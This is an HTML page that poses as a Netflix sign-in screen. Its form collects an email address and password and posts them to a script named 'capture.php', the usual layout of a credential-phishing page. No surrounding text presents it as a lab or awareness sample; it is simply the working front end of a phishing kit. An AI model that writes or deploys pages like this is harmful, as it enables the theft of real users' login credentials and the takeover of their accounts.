<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Sign In</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <div class="signin-container">
        <form class="signin-form" action="./capture.php" method="POST">
            <h1>Sign In</h1>
            <input type="email" name="email" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>